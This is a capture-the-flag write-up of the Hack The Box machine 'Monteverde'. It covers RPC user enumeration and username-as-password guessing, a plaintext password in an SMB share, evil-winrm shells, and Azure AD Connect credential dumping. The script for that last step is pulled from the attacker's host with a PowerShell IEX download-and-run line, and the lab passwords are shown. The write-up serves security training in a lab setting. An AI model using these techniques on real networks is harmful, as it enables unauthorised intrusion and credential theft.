- 2020-04-20
- HTB Monteverde

![machine profile](assets/htb_monteverde_profile.png)

**Summary:**
- Find credentials for user account over `msrpc`.
- Use credentials to enumerate SMB to discover more credentials.
- Exploit loose user permissions to dump Administrator credentials using Azure-ADConnect

**Setup:**
Add the box IP to our `/etc/hosts` file.

```console
$ printf "10.10.10.172\tmonteverde.htb\n" >> /etc/hosts
```

**Enumeration:**
Perform detailed portscan on the lower ports of `cascade.htb` using `nmap` to gather information on any exposed services. Then, perform a less resolute portscan to identify any open higher ports.

```console
$ sudo nmap -sC -sV monteverde.htb -oA nmap/initial; sleep 300 && \
    sudo nmap -p- -sS monteverde.htb -oA nmap/all-ports
$ cat nmap/initial.nmap
# Nmap 7.80 scan initiated Mon Apr  6 16:05:13 2020 as: nmap -Pn -sC -sV -oA nmap/initial monteverde.htb
Nmap scan report for monteverde.htb (10.10.10.172)
Host is up (0.041s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-06 14:27:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/6%Time=5E8B453B%P=x86_64-unknown-linux-gnu%r(
SF:DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07vers
SF:ion\x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -37m34s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-04-06T14:30:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  6 16:09:57 2020 -- 1 IP address (1 host up) scanned in 283.52 seconds
```

Kerberos stands out as an exploitable service for later. If we look at the LDAP services, the box has `MEGABANK.LOCAL0` as its FQDN, we add this to our hosts file along with `monteverde.htb`. Before we can interact with kerberos, we need to enumerate user accounts. A common theme is unsecured `msrpc` which allows us to anonymously connect and dump user account information.

```console
$ rpcclient //monteverde.htb -U "" -N
Unable to initialize messaging context
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

**User:**
If we try the username as the password for each user we have success with `SABatchJobs`. Next, we enumerate SMB as an authenticated user.

```console
$ python smbmap.py -H monteverde.htb -u SABatchJobs -p SABatchJobs
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.172...
[+] IP: 10.10.10.172:445	Name: monteverde.htb
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
...
	.
	dr--r--r--                0 Fri Jan  3 13:12:48 2020	.
	dr--r--r--                0 Fri Jan  3 13:12:48 2020	..
	dr--r--r--                0 Fri Jan  3 13:15:23 2020	dgalanos
	dr--r--r--                0 Fri Jan  3 13:41:18 2020	mhope
	dr--r--r--                0 Fri Jan  3 13:14:56 2020	roleary
	dr--r--r--                0 Fri Jan  3 13:14:28 2020	smorgan
	users$                                            	READ ONLY
```

After inspecting each folder we find what appears to be a config file.

```console
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 13:41:18 2020
  ..                                  D        0  Fri Jan  3 13:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 13:40:23 2020

		524031 blocks of size 4096. 519955 blocks available
```

Downloading this locally and opening we discover a password for mhope.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

We can now logon to the box using `evil-winrm` over `wsman` then collect our flag.

```console
$ evil-winrm -P 5985 -u mhope -p "4n0therD4y@n0th3r$" -i monteverde.htb

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> dir ../Desktop/user.txt


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt
```

**Root:**
We look at the groups mhope is in to look for loose permissions.

```console
*Evil-WinRM* PS C:\Users\mhope\Documents> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   4/22/2020 4:18:30 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

We see mhope is a member of `Azure Admins`, some searching leads us to [Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1). The HTB VPN doesn't allow external connections so we download theh script to our local machine then spawn a HTTP server.

```console
$ wget "https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1"
--2020-04-22 13:57:52--  https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.60.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.60.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2264 (2.2K) [text/plain]
Saving to: ‘Azure-ADConnect.ps1’

Azure-ADConnect.ps1          100%[===========================================>]   2.21K  --.-KB/s    in 0s

2020-04-22 13:57:52 (25.9 MB/s) - ‘Azure-ADConnect.ps1’ saved [2264/2264]

$ python -m http.server
```

Once downloaded we import the script on the remote machine then exploit.

```console
*Evil-WinRM* PS C:\Users\mhope\Documents> IEX (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX:8000/Azure-ADConnect.ps1');
*Evil-WinRM* PS C:\Users\mhope\Documents> Azure-ADConnect -server 127.0.0.1 -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
```

We now have the Administrator credentials which we can use to connect to the box then read `root.txt`.

```console
$ evil-winrm -P 5985 -u Administrator -p "d0m@in4dminyeah!" -i monteverde.htb

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop/root.txt


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 root.txt
```
